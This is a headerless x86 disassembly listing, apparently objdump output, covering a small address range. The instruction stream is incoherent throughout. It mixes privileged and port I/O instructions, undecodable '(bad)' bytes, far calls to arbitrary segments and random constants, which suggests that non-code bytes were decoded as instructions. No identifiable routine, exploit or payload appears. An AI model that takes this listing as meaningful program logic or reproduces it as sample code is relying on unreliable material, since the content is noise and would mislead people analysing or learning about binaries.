  41f67b:	stos   BYTE PTR es:[edi],al
  41f67c:	outs   dx,DWORD PTR ds:[esi]
  41f67d:	out    0xa5,eax
  41f67f:	ror    ch,cl
  41f681:	mov    eax,0x92ecfd7d
  41f686:	in     al,0xa1
  41f688:	jp     0x41f6e1
  41f68a:	or     DWORD PTR [esi],eax
  41f68c:	lods   al,BYTE PTR ds:[esi]
  41f68d:	jmp    0x41f6fa
  41f68f:	pop    ds
  41f690:	fstp   TBYTE PTR [ebp-0x46f772a2]
  41f696:	xchg   edx,eax
  41f697:	leave  
  41f698:	cdq    
  41f699:	and    BYTE PTR [ecx-0x3df8a0b9],ah
  41f69f:	nop
  41f6a0:	ror    BYTE PTR [edx],1
  41f6a2:	cdq    
  41f6a3:	loop   0x41f651
  41f6a5:	data16 mov bl,0xd5
  41f6a8:	jecxz  0x41f6fd
  41f6aa:	mov    cl,0x6d
  41f6ac:	test   al,0xaa
  41f6ae:	mov    ebx,0x64299876
  41f6b3:	cmp    al,0x3f
  41f6b5:	push   esp
  41f6b6:	rdmsr  
  41f6b8:	mov    edx,0xaa518af9
  41f6bd:	sub    BYTE PTR [esi-0x62],bh
  41f6c0:	adc    eax,0xeb13b034
  41f6c5:	scas   al,BYTE PTR es:[edi]
  41f6c6:	test   DWORD PTR [esp+eiz*2],0xda375612
  41f6cd:	shl    BYTE PTR [edi-0x34],1
  41f6d0:	xchg   esi,eax
  41f6d1:	mov    cl,0x4d
  41f6d3:	mov    esi,0x2d5b74da
  41f6d8:	shr    DWORD PTR [esp],cl
  41f6db:	dec    esp
  41f6dc:	aaa    
  41f6dd:	jecxz  0x41f712
  41f6df:	and    eax,0x49fe16ea
  41f6e4:	adc    BYTE PTR [edx+0x41],dh
  41f6e7:	rol    al,cl
  41f6e9:	and    dh,BYTE PTR [ebx+0x61c0e7f2]
  41f6ef:	fwait
  41f6f0:	mov    al,0x0
  41f6f2:	xchg   edi,eax
  41f6f3:	pusha  
  41f6f4:	es jns 0x41f6ad
  41f6f7:	push   ss
  41f6f8:	and    al,0x69
  41f6fa:	push   edi
  41f6fb:	das    
  41f6fc:	retf   
  41f6fd:	nop
  41f6fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6ff:	fwait
  41f700:	sbb    eax,0x68fe65b3
  41f705:	sbb    eax,0x6fdba8e2
  41f70a:	cmc    
  41f70b:	je     0x41f77e
  41f70d:	push   es
  41f70e:	mov    esi,DWORD PTR [ebx]
  41f710:	xchg   DWORD PTR [ebp-0x9],ecx
  41f713:	xchg   esi,eax
  41f714:	sbb    DWORD PTR [esi+0x5a],ebp
  41f717:	and    eax,0xe7056271
  41f71c:	push   ebx
  41f71d:	jmp    0xa6a9126e
  41f722:	leave  
  41f723:	mov    eax,ds:0x5f7160cb
  41f728:	sbb    edi,esi
  41f72a:	fmul   DWORD PTR [edi-0xc]
  41f72d:	sbb    eax,DWORD PTR [ebx+0x45]
  41f730:	mov    ch,0x2e
  41f732:	sub    BYTE PTR [esi],ch
  41f734:	fidivr DWORD PTR [edx]
  41f736:	stc    
  41f737:	add    eax,0xfceeeb85
  41f73c:	in     eax,0x18
  41f73e:	xor    dh,bh
  41f740:	sbb    esp,ecx
  41f742:	adc    DWORD PTR [ecx+0x22],eax
  41f745:	(bad)  
  41f746:	test   al,0x6a
  41f748:	push   edi
  41f749:	sbb    DWORD PTR [ebx-0x4ebace80],ebx
  41f74f:	in     eax,0xd7
  41f751:	sahf   
  41f752:	call   0x2e78:0xd0ba94f2
  41f759:	dec    ebp
  41f75a:	call   0xd594:0xe6413134
  41f761:	movlps xmm1,QWORD PTR [ebx]
  41f764:	mov    edi,0x9b5ebc98
  41f769:	sub    eax,0x72
  41f76c:	jecxz  0x41f717
  41f76e:	mov    esi,DWORD PTR [edi]
  41f770:	dec    esp
  41f771:	call   0xee42ce8b
  41f776:	(bad)  
  41f778:	and    eax,0x1eb33443
  41f77d:	loopne 0x41f7ad
  41f77f:	ds sbb cl,cl
  41f782:	out    dx,al
  41f783:	push   ds
  41f784:	or     al,BYTE PTR [ebp-0x674a23d0]
  41f78a:	out    dx,eax
  41f78b:	jno    0x41f7ed
  41f78d:	test   esi,edi
  41f78f:	inc    edx
  41f790:	mov    dh,0xb4
  41f792:	dec    esi
  41f793:	jmp    ebp
  41f795:	addr16 xor al,0xaa
  41f798:	leave  
  41f799:	mov    edi,0x2708abd5
  41f79e:	fs xor al,0xc3
  41f7a1:	mov    esi,0x596b2df7
  41f7a6:	ror    dl,cl
  41f7a8:	scas   eax,DWORD PTR es:[edi]
  41f7a9:	dec    esi
  41f7aa:	stc    
  41f7ab:	into   
  41f7ac:	lods   eax,DWORD PTR ds:[esi]
  41f7ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7ae:	or     dl,bl
  41f7b0:	jge    0x41f745
  41f7b2:	outs   dx,DWORD PTR ds:[esi]
  41f7b3:	lahf   
  41f7b4:	fiadd  WORD PTR [eax+0x7431dfbc]
  41f7ba:	ds push 0xb889def3
  41f7c0:	push   ds
  41f7c1:	fs out dx,eax
  41f7c3:	sub    eax,0x269b885e
  41f7c8:	lds    eax,FWORD PTR [edx+0x1c00dec6]
  41f7ce:	mov    fs,WORD PTR [ebp-0x5655df8b]
  41f7d4:	xor    eax,0xa5e436e7
  41f7d9:	outs   dx,DWORD PTR ds:[esi]
  41f7da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7db:	aaa    
  41f7dc:	cmp    al,0xe6
  41f7de:	cwde   
  41f7df:	ret    0x3b24
  41f7e2:	mov    dh,0xdd
  41f7e4:	loopne 0x41f83a
  41f7e6:	cmp    esi,esp
  41f7e8:	pop    es
  41f7e9:	cmp    al,0x41
  41f7eb:	sub    al,0xb6
  41f7ed:	mov    esi,DWORD PTR [edi+0x5]
  41f7f0:	mov    al,ds:0x9c14a598
  41f7f5:	fild   DWORD PTR [ebp+0x1601351d]
  41f7fb:	cwde   
  41f7fc:	scas   al,BYTE PTR es:[edi]
  41f7fd:	sbb    eax,DWORD PTR [eax+0x2e08c1b5]
  41f803:	adc    al,0x14
  41f805:	inc    ebx
  41f806:	sbb    al,0xfa
  41f808:	dec    ebp
  41f809:	sbb    al,0xb
  41f80b:	ror    DWORD PTR [edi-0x71],1
  41f80e:	push   ecx
  41f80f:	into   
  41f810:	adc    BYTE PTR [esi-0x10],ch
  41f813:	lahf   
  41f814:	(bad)  
  41f815:	(bad)  
  41f816:	push   ebx
  41f817:	(bad)  
  41f818:	dec    edx
  41f819:	aam    0x3c
  41f81b:	loopne 0x41f7f2
  41f81d:	mov    al,ds:0x59a34b4a
  41f822:	push   es
  41f823:	loop   0x41f865
  41f825:	int3   
  41f826:	jbe    0x41f88c
  41f828:	out    0x35,al
  41f82a:	loope  0x41f82c
  41f82c:	aas    
  41f82d:	dec    ebx
  41f82e:	retf   0x3092
  41f831:	fidiv  WORD PTR [eax-0x59d05f90]
  41f837:	pop    es
  41f838:	fdivrp st(0),st
  41f83a:	jmp    0x41f89e
  41f83c:	xchg   ebp,eax
  41f83d:	xchg   BYTE PTR [edi+0x2915a6a],ah
  41f843:	sbb    DWORD PTR [eax+esi*1-0x322e09a8],ebx
  41f84a:	rcr    DWORD PTR [esi+eiz*8],1
  41f84d:	out    0x31,eax
  41f84f:	and    BYTE PTR [eax+0x59002e4d],0x20
  41f856:	test   BYTE PTR [eax+0x2],dh
  41f859:	and    al,0x1c
  41f85b:	ds jg  0x41f7e8
  41f85e:	cld    
  41f85f:	inc    ecx
  41f860:	push   ecx
  41f862:	pop    ss
  41f863:	adc    BYTE PTR [ebx+0x4f],dh
  41f866:	dec    edx
  41f867:	arpl   WORD PTR [eax-0xef6f9e6],bx
  41f86d:	and    al,0x9a
  41f86f:	jbe    0x41f899
  41f871:	and    DWORD PTR [eax+0x11],edi
  41f874:	imul   ebx,DWORD PTR [edi+0x8],0x3e
  41f878:	xor    al,0xf
  41f87a:	or     BYTE PTR [ebx-0x5f058409],dh
  41f880:	jle    0x41f862
  41f882:	add    cl,BYTE PTR [esi-0x72bebf6a]
  41f888:	scas   eax,DWORD PTR es:[edi]
  41f889:	das    
  41f88a:	xor    eax,0x6ffb7857
  41f88f:	inc    ecx
  41f890:	(bad)  
  41f891:	imul   esp,edx,0x5bd24a57
  41f897:	mov    ch,0xf2
  41f899:	test   DWORD PTR [ecx],ecx
  41f89b:	cmp    ebp,DWORD PTR [esi-0x71]
  41f89e:	sbb    al,BYTE PTR [bx+0x2636]
  41f8a3:	shr    DWORD PTR [edx-0x6ceae0a],0x71
  41f8aa:	std    
  41f8ab:	mov    ecx,0xa007dabe
  41f8b0:	mov    bh,0xe5
  41f8b2:	add    dl,BYTE PTR [ebp+0x3d]
  41f8b5:	sbb    edx,DWORD PTR [ecx+0x1e21d5e2]
  41f8bb:	mov    edx,0x1c2f72f4
  41f8c0:	ror    BYTE PTR [edi],cl
  41f8c2:	in     al,0x3a
  41f8c4:	pop    edx
  41f8c5:	cmp    BYTE PTR [ebx+edx*2],bh
  41f8c8:	xchg   DWORD PTR [ebp+edi*8-0x30],ebx
  41f8cc:	mov    esp,0x81beab69
  41f8d1:	in     al,0x9d
  41f8d3:	daa    
  41f8d4:	ins    BYTE PTR es:[edi],dx
  41f8d5:	push   esp
  41f8d6:	or     DWORD PTR [ecx-0x491768df],0x6
  41f8dd:	xchg   ebp,edx
  41f8df:	out    dx,eax
  41f8e0:	push   esi
  41f8e1:	sbb    eax,0x42487c7c
  41f8e6:	and    DWORD PTR [edx+0x58b4ee01],ecx
  41f8ec:	stos   BYTE PTR es:[edi],al
  41f8ed:	mov    DWORD PTR [eax+esi*2+0x7a],esi
  41f8f1:	mov    ds:0xb8d3525d,eax
  41f8f6:	popa   
  41f8f7:	pop    edi
  41f8f8:	es dec eax
  41f8fa:	sub    dl,BYTE PTR [ebp-0x5c234c7e]
  41f900:	js     0x41f8b1
  41f902:	out    0x86,eax
  41f904:	mov    dh,0x4b
  41f906:	and    ecx,ebx
  41f908:	ficom  DWORD PTR [esi+esi*2+0x38fc207a]
  41f90f:	nop
  41f910:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f911:	sbb    esi,DWORD PTR [eax+ebx*8-0x43]
  41f915:	mov    dl,0x94
  41f917:	les    ebx,FWORD PTR [esi-0x73]
  41f91a:	aad    0xff
  41f91c:	jnp    0x41f8aa
  41f91e:	pusha  
  41f91f:	aam    0xeb
  41f921:	lahf   
  41f922:	xchg   BYTE PTR [edx],bh
  41f924:	pop    esi
  41f925:	adc    ah,BYTE PTR [esi]
  41f927:	arpl   cx,bp
  41f929:	xor    esp,edx
  41f92b:	push   edx
  41f92c:	or     al,0xb0
  41f92e:	push   cs
  41f92f:	jbe    0x41f8c7
  41f931:	mov    edx,DWORD PTR [edx-0x10c6d6fd]
  41f937:	in     al,0x49
  41f939:	jbe    0x41f968
  41f93b:	cld    
  41f93c:	mov    esp,DWORD PTR [eax-0x4]
  41f93f:	bound  esi,QWORD PTR [eax-0x27]
  41f942:	xor    BYTE PTR [esi],ch
  41f944:	retf   0x333
  41f947:	rcr    DWORD PTR [ebp+0x29793431],1
  41f94d:	push   es
  41f94e:	aaa    
  41f94f:	popa   
  41f950:	fist   DWORD PTR cs:[ecx+ebx*8-0x19ca7a23]
  41f958:	in     eax,dx
  41f959:	push   ebp
  41f95a:	jp     0x41f99b
  41f95c:	shl    DWORD PTR [ebx-0x34],1
  41f95f:	add    eax,0x63345d65
  41f964:	inc    ebp
  41f965:	dec    esi
  41f966:	adc    DWORD PTR [ebp+0x3e],0x5a20b9bd
  41f96d:	imul   ecx,DWORD PTR [eax+0xf8038bc],0x73
  41f974:	lds    edx,FWORD PTR [esi+0x799a95d8]
  41f97a:	dec    esi
  41f97b:	sub    cl,BYTE PTR [eax+0x7b84de6]
  41f981:	in     al,dx
  41f982:	ins    DWORD PTR es:[edi],dx
  41f983:	and    eax,0x6ffe5777
  41f988:	dec    edi
  41f989:	jmp    0x41f982
  41f98b:	mov    al,0xf8
  41f98d:	inc    esi
  41f98e:	pushf  
  41f98f:	scas   al,BYTE PTR es:[edi]
  41f990:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f991:	les    esi,FWORD PTR [eax-0x4]
  41f994:	cmp    eax,0xb0ce3559
  41f999:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f99a:	xor    al,0x8f
  41f99c:	xor    BYTE PTR [edx+0xf],bh
  41f99f:	mov    cl,0x1a
  41f9a1:	ins    BYTE PTR es:[edi],dx
  41f9a2:	xchg   ecx,eax
  41f9a3:	jge    0x41f936
  41f9a5:	or     eax,0x26499ea8
  41f9aa:	adc    BYTE PTR [esi],bl
  41f9ac:	push   ss
  41f9ad:	xchg   ecx,eax
  41f9ae:	imul   ebx,DWORD PTR [edx+0x54],0x58
  41f9b2:	cmp    BYTE PTR [edx+eax*4+0x18],0xf8
  41f9b7:	test   DWORD PTR [ebp+0x14c0708a],ebx
  41f9bd:	adc    eax,esi
  41f9bf:	shl    dl,0xb9
  41f9c2:	fwait
  41f9c3:	xchg   edx,eax
  41f9c4:	int    0x10
  41f9c6:	fcmovu st,st(1)
  41f9c8:	stos   BYTE PTR es:[edi],al
  41f9c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9ca:	out    0xff,eax
  41f9cc:	maskmovq mm5,(bad)
  41f9cd:	imul   DWORD PTR [ebp-0x77]
  41f9d0:	mov    bl,0x85
  41f9d2:	ret    
  41f9d3:	ret    
  41f9d4:	lds    edx,FWORD PTR [edx-0x79b0e8ec]
  41f9da:	and    eax,eax
  41f9dc:	loop   0x41fa2a
  41f9de:	jns    0x41f9a2
  41f9e0:	or     al,BYTE PTR [edi]
  41f9e2:	pop    es
  41f9e3:	cmp    edi,eax
  41f9e5:	jae    0x41fa65
  41f9e7:	in     eax,0x48
  41f9e9:	cmp    DWORD PTR [eax+0x68],edx
  41f9ec:	loopne 0x41f9e4
  41f9ee:	sub    DWORD PTR [ecx+0x4e8eac52],0x5dcdd84c
  41f9f8:	and    edx,DWORD PTR [edi+0x18]
  41f9fb:	push   0x8bddd296
  41fa00:	bound  ebx,QWORD PTR [ecx+0x3033cd37]
  41fa06:	dec    eax
  41fa07:	pop    ss
  41fa08:	ror    DWORD PTR [edi-0x75fa85f7],cl
  41fa0e:	repnz test DWORD PTR [edx],ecx
  41fa11:	imul   esp,DWORD PTR [edx-0x62be8305],0x3f60281f
  41fa1b:	pop    esi
  41fa1c:	mov    BYTE PTR [edi],dh
  41fa1e:	inc    ecx
  41fa1f:	mov    ds:0x7c500203,al
  41fa24:	scas   eax,DWORD PTR es:[edi]
  41fa25:	jno    0x41fa6c
  41fa27:	jo     0x41fa49
  41fa29:	ins    BYTE PTR es:[edi],dx
  41fa2a:	jp     0x41fa73
  41fa2c:	push   ds
  41fa2d:	push   es
  41fa2e:	jne    0x41fa6c
  41fa30:	sbb    edx,DWORD PTR [edi]
  41fa32:	and    BYTE PTR [eax],0xa6
  41fa35:	in     eax,dx
  41fa36:	xor    al,0xd3
  41fa38:	mov    edi,DWORD PTR [ecx+0x3b]
  41fa3b:	popa   
  41fa3c:	lahf   
  41fa3d:	add    dl,BYTE PTR [esp+ebx*2-0x23]
  41fa41:	arpl   WORD PTR [ecx+0x3509bf8a],bx
  41fa47:	push   ebx
  41fa48:	lea    ebx,[esi-0x17b9ecdf]
  41fa4e:	inc    ebx
  41fa4f:	pop    es
  41fa50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa51:	cmp    al,0x9f
  41fa53:	enter  0x95aa,0xdd
  41fa57:	clc    
  41fa58:	imul   edx,DWORD PTR [ebp-0x6df2205e],0x7899f673
  41fa62:	call   0xeb95:0x624b2bf3
  41fa69:	out    0x4e,al
  41fa6b:	nop
  41fa6c:	mov    bh,0x99
  41fa6e:	call   0x647db3ac
  41fa73:	mov    ds:0xc15022fe,eax
  41fa78:	mov    ds:0xa76185f7,al
  41fa7d:	(bad)  
  41fa7e:	das    
  41fa7f:	pushf  
  41fa80:	aas    
  41fa81:	mov    cl,0xeb
  41fa83:	pop    ds
  41fa84:	dec    ecx
  41fa85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa86:	dec    BYTE PTR [eax-0x395877d0]
  41fa8c:	loope  0x41fb02
  41fa8e:	in     al,dx
  41fa8f:	mov    bh,0x0
  41fa91:	jge    0x41fa1b
  41fa93:	mov    al,0x60
  41fa95:	shr    BYTE PTR [ecx+0x62a6c7e8],cl
  41fa9b:	icebp  
  41fa9c:	les    ebp,FWORD PTR [ebp*8+0x33a1941d]
  41faa3:	sbb    al,0x72
  41faa5:	sbb    eax,0xe7b866d8
  41faaa:	xchg   DWORD PTR [ecx-0x9e67d00],ebp
  41fab0:	mov    bh,0x39
  41fab2:	icebp  
  41fab3:	int3   
  41fab4:	aas    
  41fab5:	das    
  41fab6:	push   eax
  41fab7:	jg     0x41fb19
  41fab9:	fisub  DWORD PTR [eax-0x312e8dee]
  41fabf:	out    dx,eax
  41fac0:	(bad)  
  41fac2:	push   esi
  41fac3:	sub    al,0xeb
  41fac5:	cli    
  41fac6:	jg     0x41fb18
  41fac8:	add    al,0x8f
  41faca:	inc    eax
  41facb:	add    bl,BYTE PTR [esi+ebx*2]
  41face:	ror    DWORD PTR [ecx-0x49],0x42
  41fad2:	adc    ah,BYTE PTR [ebx-0x6117cbc9]
  41fad8:	(bad)  
  41fad9:	mov    edi,0x73095be6
  41fade:	shl    BYTE PTR [eax+0x2d],1
  41fae1:	(bad)  
  41fae2:	xchg   ebp,eax
  41fae3:	adc    bh,BYTE PTR [edi+0x6f683b4e]
  41fae9:	fimul  WORD PTR [esi]
  41faeb:	adc    bh,dl
  41faed:	stc    
  41faee:	fmul   QWORD PTR [esi-0x1fc5b8d0]
  41faf4:	dec    ecx
  41faf5:	pop    esi
  41faf6:	sti    
  41faf7:	xchg   cl,bh
  41faf9:	jmp    0xa7e6:0x537eade5
  41fb00:	or     ebp,DWORD PTR [ebx]
  41fb02:	lds    ebx,FWORD PTR [eax]
  41fb04:	bound  esp,QWORD PTR [edi]
  41fb06:	add    eax,0x79978ca4
  41fb0b:	push   esp
  41fb0c:	push   0xffffff8f
  41fb0e:	and    esp,DWORD PTR [eax-0x3b]
  41fb11:	out    0x36,al
  41fb13:	addr16 jbe 0x41fa9e
  41fb16:	jb     0x41fad2
  41fb18:	cld    
  41fb19:	inc    eax
  41fb1a:	pop    esi
  41fb1b:	rcl    ebp,cl
  41fb1d:	inc    ebp
  41fb1e:	inc    ecx
  41fb1f:	(bad)  
  41fb20:	mov    ds:0xef3161a2,eax
  41fb25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb26:	jns    0x41fb7c
  41fb28:	clc    
  41fb29:	cmc    
  41fb2a:	shl    BYTE PTR [ecx],cl
  41fb2c:	scas   eax,DWORD PTR es:[edi]
  41fb2d:	rcr    ch,1
  41fb2f:	sbb    BYTE PTR [ecx],0xa0
  41fb32:	xor    BYTE PTR [esi-0x71],bl
  41fb35:	inc    esp
  41fb36:	mov    edi,0xfb9f91a3
  41fb3b:	cdq    
  41fb3c:	xor    ah,cl
  41fb3e:	xor    DWORD PTR [edi-0x24271895],edi
  41fb44:	lds    eax,FWORD PTR [ecx+0x48]
  41fb47:	stos   DWORD PTR es:[edi],eax
  41fb48:	leave  
  41fb49:	js     0x41fb7e
  41fb4b:	shl    DWORD PTR [bp+0x7ec7],cl
  41fb50:	outs   dx,DWORD PTR ds:[esi]
  41fb51:	addr16 cmp eax,0x36db820c
  41fb57:	repnz lahf 
  41fb59:	ret    
  41fb5a:	ds je  0x41fb2b
  41fb5d:	xlat   BYTE PTR ds:[ebx]
  41fb5e:	jge    0x41fb96
  41fb60:	nop
  41fb61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb62:	adc    al,0xe3
  41fb64:	pop    esp
  41fb65:	int3   
  41fb66:	rcr    esi,1
  41fb68:	add    cl,BYTE PTR ds:0x31703ed3
  41fb6e:	(bad)  
  41fb70:	inc    eax
  41fb71:	cmp    bl,BYTE PTR [ebp-0x1f]
  41fb74:	mov    ah,0x1e
  41fb76:	pop    esi
  41fb77:	add    DWORD PTR [ebp+ecx*4+0x2ba3b4ec],0xa478a4ce
  41fb82:	add    BYTE PTR [edx+eax*8+0x71140a4b],0x6c
  41fb8a:	mov    eax,0x7c3db3f9
  41fb8f:	pop    edi
  41fb90:	call   0x7d6b:0xf43cfb16
  41fb97:	jl     0x41fbaa
  41fb99:	or     eax,0x8e9048ae
  41fb9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fba0:	jl     0x41fbc5
  41fba2:	ficomp WORD PTR [ecx+0x5e1cabb4]
  41fba8:	mov    eax,0xc8bc62bf
  41fbad:	mov    ebp,0x358f3930
  41fbb2:	fwait
  41fbb3:	pop    eax
  41fbb4:	rcl    DWORD PTR [edi+eax*4],cl
  41fbb7:	mov    ah,BYTE PTR [ebx+eax*4-0x61]
  41fbbb:	leave  
  41fbbc:	mov    bl,0xc6
  41fbbe:	jo     0x41fb99
  41fbc0:	mov    edx,0x2cf865e7
  41fbc5:	ror    DWORD PTR [eax+edi*8],0xab
  41fbc9:	mov    ds:0xc65057be,al
  41fbce:	call   0xbabf:0x3819e1c9
  41fbd5:	sbb    BYTE PTR [eax+0x8d5d5ca],al
  41fbdb:	xchg   ecx,eax
  41fbdc:	mov    edx,0xc4a0e71a
  41fbe1:	mov    bh,0xe7
  41fbe3:	jge    0x41fbd7
  41fbe5:	and    ebp,DWORD PTR [ebx+0x2bc17d15]
  41fbeb:	jp     0x41fc35
  41fbed:	mov    cl,0xd3
  41fbef:	dec    eax
  41fbf0:	sub    al,0x42
  41fbf2:	shr    DWORD PTR [edx+eiz*8],1
  41fbf5:	fmul   QWORD PTR [ecx+0xe]
  41fbf8:	scas   eax,DWORD PTR es:[edi]
  41fbf9:	cld    
  41fbfa:	push   ebx
  41fbfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbfc:	mov    esp,eax
  41fbfe:	sti    
  41fbff:	nop
  41fc00:	mov    ecx,es
  41fc02:	out    0x76,eax
  41fc04:	rol    BYTE PTR [eax],cl
  41fc06:	mov    ds:0x18158ede,eax
  41fc0b:	nop
  41fc0c:	jecxz  0x41fbf7
  41fc0e:	sysenter 
  41fc10:	dec    eax
  41fc11:	cmp    eax,0xf5b79226
  41fc16:	jmp    0x74fc6099
  41fc1b:	aaa    
  41fc1c:	mov    eax,ds:0x79e02c67
  41fc21:	jb     0x41fc31
  41fc23:	inc    ecx
  41fc24:	popf   
  41fc25:	hlt    
  41fc26:	shr    DWORD PTR [edx-0x62],0x5c
  41fc2a:	jno    0x41fc7a
  41fc2c:	jge    0x41fbf3
  41fc2e:	pop    ss
  41fc2f:	repz mov bl,0xea
  41fc32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc33:	dec    edx
  41fc34:	retf   
  41fc35:	xchg   DWORD PTR [edx-0x152de4d2],ecx
  41fc3b:	js     0x41fc92
  41fc3d:	xor    eax,0xaf74997b
  41fc42:	scas   eax,DWORD PTR es:[edi]
  41fc43:	int    0x38
  41fc45:	sub    BYTE PTR [edi+0xe97eaf1],dh
  41fc4b:	xchg   BYTE PTR [ebx+esi*8],cl
  41fc4e:	inc    eax
  41fc4f:	cmp    DWORD PTR [ebx],esi
  41fc51:	sub    ah,0xfd
  41fc54:	or     al,0x5f
  41fc56:	into   
  41fc57:	xor    eax,0x27fc23a0
  41fc5c:	rcl    BYTE PTR [edi+0x3],0x9c
  41fc60:	jno    0x41fc4e
  41fc62:	icebp  
  41fc63:	inc    edi
  41fc64:	mov    ecx,0xab3638dc
  41fc69:	jnp    0x41fc1a
  41fc6b:	sub    al,0x19
  41fc6e:	and    eax,0xdff2f5a1
  41fc73:	xor    esp,DWORD PTR [ebx+eiz*1]
  41fc76:	and    edx,DWORD PTR [ebp+0x6f1bb34d]
  41fc7c:	push   esp
  41fc7d:	cmp    DWORD PTR [ecx-0x16],edi
  41fc80:	xchg   edx,eax
  41fc81:	jne    0x41fc1c
  41fc83:	imul   ecx,DWORD PTR [edx+0x6e688664],0xffffffa3
  41fc8a:	scas   ax,WORD PTR es:[edi]
  41fc8c:	add    al,0xa6
  41fc8e:	add    eax,0xca65a223
  41fc93:	sti    
  41fc94:	sti    
  41fc95:	jmp    0x263a91e8
  41fc9a:	cwde   
  41fc9b:	adc    ebp,DWORD PTR [edx-0x12f0f20d]
  41fca1:	aam    0xd4
  41fca3:	test   eax,0x3d8a3bcb
  41fca8:	mov    bl,0xf8
  41fcaa:	lods   al,BYTE PTR ds:[esi]
  41fcab:	push   edx
  41fcac:	adc    al,0x37
  41fcae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcaf:	repz leave 
  41fcb1:	mov    ch,0x57
  41fcb3:	add    esp,ebp
  41fcb5:	inc    edx
  41fcb6:	das    
  41fcb7:	inc    eax
  41fcb8:	out    dx,al
  41fcb9:	xchg   DWORD PTR [eax-0x38ae9e5c],ebx
  41fcbf:	and    edx,0x42
  41fcc2:	mov    ds:0x2eaf2db4,al
  41fcc7:	aad    0x22
  41fcc9:	jb     0x41fc6c
  41fccb:	lock sub cl,bh
  41fcce:	aad    0x8b
  41fcd0:	lods   al,BYTE PTR ds:[esi]
  41fcd1:	xchg   DWORD PTR [edi-0x7d],esi
  41fcd4:	ss mov bl,0x2c
  41fcd7:	ins    BYTE PTR es:[edi],dx
  41fcd8:	push   0x9
  41fcda:	pop    ss
  41fcdb:	(bad)  
  41fcdc:	jge    0x41fcb0
  41fcde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcdf:	pop    eax
  41fce0:	outs   dx,DWORD PTR ds:[esi]
  41fce1:	pop    ebp
  41fce2:	adc    DWORD PTR [eax],edx
  41fce4:	es push eax
  41fce6:	cmp    cl,ah
  41fce8:	sub    DWORD PTR [esi-0x1359d81e],0xffffffb7
  41fcef:	dec    ebp
  41fcf0:	fild   WORD PTR [edi-0x7b54516e]
  41fcf6:	sbb    bl,BYTE PTR [eax+ebx*1-0x78f63217]
  41fcfd:	mov    WORD PTR [edx],ss
  41fcff:	jbe    0x41fc97
  41fd01:	xchg   edx,eax
  41fd02:	mov    gs,WORD PTR [edi+0x23]
  41fd05:	adc    DWORD PTR [esi+0x4a],ecx
  41fd08:	lock cmc 
  41fd0a:	es inc ecx
  41fd0c:	jbe    0x41fcd7
  41fd0e:	imul   ebx,DWORD PTR [ebx-0x66],0x1756c0db
  41fd15:	fcmovbe st,st(7)
  41fd17:	dec    edx
  41fd18:	je     0x41fcd8
  41fd1a:	retf   
  41fd1b:	add    eax,0xf55a4548
  41fd20:	pop    es
  41fd21:	ds cs xor esi,ebp
  41fd25:	push   ebx
  41fd26:	push   ebx
  41fd27:	jnp    0x41fd91
  41fd29:	dec    esp
  41fd2a:	cmp    DWORD PTR [esi-0x40],esi
  41fd2d:	or     DWORD PTR ds:[ebx],ecx
  41fd30:	rcr    DWORD PTR [edx],1
  41fd32:	push   cs
  41fd33:	push   esi
  41fd34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd35:	add    dh,BYTE PTR [edx]
  41fd37:	cmp    DWORD PTR [ebx+ebx*4+0x539461b],ebx
  41fd3e:	(bad)  
  41fd3f:	push   esp
  41fd40:	enter  0x1c87,0xf1
  41fd44:	push   es
  41fd45:	fild   DWORD PTR [esi]
  41fd47:	sub    bh,ah
  41fd49:	aaa    
  41fd4a:	push   ecx
  41fd4b:	fstp   QWORD PTR [ebp-0x2d]
  41fd4e:	inc    esi
  41fd4f:	popa   
  41fd50:	push   ebx
  41fd51:	fimul  DWORD PTR [edi-0x5a]
  41fd54:	das    
  41fd55:	fnsave [esi]
  41fd57:	nop
  41fd58:	xchg   esp,eax
  41fd59:	dec    edi
  41fd5a:	aam    0x42
  41fd5c:	popa   
  41fd5d:	dec    ebx
  41fd5e:	push   0x68
  41fd60:	sbb    ebx,esi
  41fd62:	adc    esp,DWORD PTR [esi-0x190e2a9f]
  41fd68:	not    DWORD PTR [edi]
  41fd6a:	bound  esp,QWORD PTR [ebx]
  41fd6c:	ss popf 
  41fd6e:	and    BYTE PTR [esi+0x41],bl
  41fd71:	(bad)  
  41fd72:	lea    ecx,[esi+0x60]
  41fd75:	jl     0x41fd9a
  41fd77:	xchg   edi,eax
  41fd78:	cmp    eax,0xac25afda
  41fd7d:	mov    dh,0x60
  41fd7f:	push   eax
  41fd80:	or     al,0xf4
  41fd82:	sbb    al,0xef
  41fd84:	stos   BYTE PTR es:[edi],al
  41fd85:	adc    esi,ebx
  41fd87:	and    eax,DWORD PTR ds:0x705416ef
  41fd8d:	cmp    esp,ebp
  41fd8f:	out    dx,al
  41fd90:	xor    eax,0xc6b97bd5
  41fd95:	cmp    eax,0x2e8b839
  41fd9a:	xchg   BYTE PTR [ebx],ah
  41fd9c:	push   edi
  41fd9d:	xchg   esp,eax
  41fd9e:	mov    ah,0x7e
  41fda0:	ror    BYTE PTR [ebx+ebx*4-0x14],0xd4
  41fda5:	pop    edi
  41fda6:	cwde   
  41fda7:	out    0xbf,al
  41fda9:	and    al,0x98
  41fdab:	mov    DWORD PTR [ecx+0x58],edx
  41fdae:	pop    esp
  41fdaf:	push   es
  41fdb0:	jb     0x41fd92
  41fdb2:	pop    edx
  41fdb3:	mov    dh,0x65
  41fdb5:	lods   al,BYTE PTR ds:[esi]
  41fdb6:	int    0x5b
  41fdb8:	bound  eax,QWORD PTR [ecx]
  41fdba:	mov    bl,0xfc
